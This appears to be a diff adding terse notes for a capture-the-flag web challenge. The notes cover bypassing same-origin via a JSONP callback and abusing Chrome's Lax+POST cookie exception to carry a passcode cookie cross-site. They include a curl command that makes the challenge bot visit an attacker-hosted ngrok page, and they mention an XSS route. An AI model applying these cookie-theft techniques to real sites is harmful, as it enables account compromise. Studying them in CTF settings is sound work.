@@ -1,0 +1,31 @@
+Source: https://blog.bi0s.in/2021/04/08/Web/Jason-Angstrom21/
+
+res.jsonp endpoint has a defult endpoint called callback that could be used to get back JSONP data.
+
+
+callback_test.html
+	Successfully bypass sameOrigin
+
+Next Step
+	To retrieve flag, we need to send the passcode cookie to the flag endpoint. The issue is that, with chrome's latest update, all the cookies are defaulted to lax from none and this prevents the cookies from being sent cross-site.
+
+========================= Intended Solution =========================
+Documentation:
+	https://www.chromium.org/updates/same-site/faq
+
+Q: What is the Lax + POST mitigation?
+	This is a specific exception made to account for existing cookie usage on some Single Sign-On implementations where a CSRF token is expected on a cross-site POST request. This is purely a temporary solution and will be removed in the future. It does not add any new behavior, but instead is just not applying the new SameSite=Lax default in certain scenarios.
+
+	Specifically, a cookie that is at most 2 minutes old will be sent on a top-level cross-site POST request. However, if you rely on this behavior, you should update these cookies with the `SameSite=None; Secure` attributes to ensure they continue to function in the future.
+
+
+jason_1.html
+
+
+curl -X POST "https://jason.2021.chall.actf.co/visit" --data "site=http://9e484e02a329.ngrok.io/jason_1.html"
+
+
+========================= Unintended Solution =========================
+Setup xss payload in reaction.py challenge
+
+
